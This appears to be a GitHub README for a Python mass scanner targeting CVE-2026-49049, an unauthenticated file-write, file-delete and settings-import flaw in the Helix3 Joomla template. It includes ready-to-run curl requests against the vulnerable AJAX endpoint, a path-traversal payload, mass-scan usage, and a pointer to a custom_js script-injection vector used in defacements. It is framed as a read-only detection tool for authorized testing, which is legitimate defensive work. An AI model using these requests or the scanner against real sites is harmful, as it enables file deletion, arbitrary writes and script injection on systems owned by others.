<p align="center">
  <img src="https://img.shields.io/badge/python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/CVE-2026--49049-CC0000?style=flat-square" alt="CVE">
  <img src="https://img.shields.io/badge/CVSS-7.5_HIGH-CC0000?style=flat-square" alt="CVSS">
  <img src="https://img.shields.io/badge/license-MIT-97CA00?style=flat-square" alt="License">
</p>

<h3 align="center">CVE-2026-49049 — Helix3 Joomla Plugin (JoomShaper)</h3>
<h4 align="center">Unauthenticated AJAX Handler — Read-Only Vulnerability Scanner</h4>

---

## Overview

**CVE-2026-49049** affects the Helix3 template framework for Joomla (versions **1.0 through 3.1.0**). The `onAjaxHelix3` handler, reachable via Joomla's `com_ajax` dispatcher, performs **no authentication, authorization, or CSRF validation** on several destructive actions:

| Action | Impact | Available In |
|---|---|---|
| `save` | Writes attacker-controlled JSON files with **path traversal** | All versions |
| `remove` | Deletes arbitrary files — **no extension or path restriction** | All versions |
| `import` | Overwrites stored template parameters in the database | **v3.x only** |

> **Note:** The `import` action was added in Helix3 v3.x. Sites running v2.x are only affected by `save` and `remove`.

The vulnerability was discovered by **Phil Taylor** (mySites.guru) and published June 29, 2026.

### Affected Versions

| Helix3 Version | save/remove | import |
|---|---|---|
| 1.0 – 2.x | Vulnerable | Not present |
| 3.0 – 3.1.0 | Vulnerable | Vulnerable |
| 3.1.1+ | Patched | Patched |

---

## Installation

```bash
git clone https://github.com/shinthink/CVE-2026-49049.git
cd CVE-2026-49049
pip install -r requirements.txt
```

---

## Usage

```bash
# Single target
python cve_2026_49049.py -t 192.168.1.100

# Mass scan
python cve_2026_49049.py -f targets.txt -o results.txt

# With JSON report + verbose
python cve_2026_49049.py -f targets.txt --json report.json -v
```

### Arguments

```
  -t, --target     Single target (domain or IP)
  -f, --file       File with targets, one per line
  -o, --output     Real-time text output (default: cve-2026-49049_scan.txt)
  --json           Structured JSON report (default: cve-2026-49049_report.json)
  --threads        Concurrent workers (default: 15)
  --timeout        HTTP timeout in seconds (default: 15)
  -v, --verbose    Show probe details
```

---

## Proof of Concept

### Detection & Validation

The scanner performs a **read-only probe** — it writes a harmless JSON file to the Helix3 layout folder via the unauthenticated `save` endpoint, verifies it was written, then immediately deletes it via the `remove` endpoint. No persistent changes are left on the target.

```bash
$ python cve_2026_49049.py -t 192.168.1.100 -v
```

```
    CVE-2026-49049 — Helix3 (JoomShaper)
    Joomla Unauthenticated AJAX Handler Scanner

    [*] save   — accessible (probe: 3a9719da)
    [*] remove — accessible (probe cleaned)

  Host      : 192.168.1.100
  Status    : vulnerable
  Helix3    : 2.5.6
  Vulnerable: YES
  save      : YES
  remove    : YES
  import    : NO
  Time      : 2.0s
```

### Manual Reproduction

The scanner probes these exact endpoints. For manual verification:

**Step 1 — Confirm Helix3 is installed**

```bash
curl -sk 'https://target.com/templates/shaper_helix3/templateDetails.xml'
# Look for <version>X.X.X</version>
```

**Step 2 — Test save action (unauthenticated file write)**

```bash
curl -sk -X POST \
  'https://target.com/index.php?option=com_ajax&plugin=helix3&format=json' \
  -d 'data[action]=save&data[layoutName]=_test_probe&data[content]={"probe":"test"}'
```

**Step 3 — Test remove action (unauthenticated file delete)**

```bash
curl -sk -X POST \
  'https://target.com/index.php?option=com_ajax&plugin=helix3&format=json' \
  -d 'data[action]=remove&data[layoutName]=_test_probe.json'
```

**Step 4 — Test import action (v3.x only, not available in v2.x)**

```bash
curl -sk -X POST \
  'https://target.com/index.php?option=com_ajax&plugin=helix3&format=json' \
  -d 'data[action]=import&data[template_id]=1&data[settings]={}'

# Note: import was added in Helix3 v3.x.
# Sites running v2.x will return an empty response for this action.
```

### Vulnerability Mechanism

In Helix3 versions before 3.1.1, `plugins/ajax/helix3/helix3.php` processes requests via `onAjaxHelix3()` with **no guards**:

```php
public function onAjaxHelix3()
{
    $input = Factory::getApplication()->input;
    $data  = $input->post->get('data', [], 'array');
    $action = $data['action'];
    $layoutName = $data['layoutName'];

    // No auth check. No CSRF token. No path validation.
    $filepath = $layoutPath . $layoutName;   // path traversal possible

    switch ($action) {
        case 'remove':
            unlink($filepath);               // arbitrary file delete
            break;
        case 'save':
            fwrite(fopen($filepath . '.json', 'wb'), $data['content']);  // write
            break;
    }
}
```

### What Makes This Dangerous

- **Save + path traversal** — `layoutName=../../../somewhere/evil` writes files outside the intended layout directory
- **Remove has no extension restriction** — unlike `save` (which appends `.json`), `remove` can target any file type
- **Import (v3.x) overwrites database params** — `custom_js` is rendered **unescaped** in the template output, enabling script injection on every page. This is the vector used in real-world defacement attacks.

---

## Disclaimer

> **FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**
>
> This software is intended for security professionals conducting authorized penetration tests, organizations auditing their own infrastructure, and researchers studying vulnerability exploitation.
>
> Unauthorized access to computer systems is illegal and may violate:
> - United States: Computer Fraud and Abuse Act (18 U.S.C. 1030)
> - Indonesia: UU ITE Pasal 30 & 46
> - European Union: Directive 2013/40/EU
> - United Kingdom: Computer Misuse Act 1990
>
> The authors assume no liability for misuse. By using this software, you accept full responsibility for your actions.

---

## References

| Resource | Link |
|---|---|
| Original Advisory (mySites.guru) | [Helix3 3.1.1 Security Fix](https://mysites.guru/blog/helix3-security-update-changelog-failure/) |
| NVD Entry | [CVE-2026-49049](https://nvd.nist.gov/vuln/detail/CVE-2026-49049) |
| OpenCVE | [CVE-2026-49049](https://app.opencve.io/cve/CVE-2026-49049) |
| JoomShaper GitHub | [Helix3 Repository](https://github.com/JoomShaper/Helix3) |

---

<p align="center">
  <sub>This project is not affiliated with JoomShaper, Joomla, or Open Source Matters, Inc.</sub>
</p>
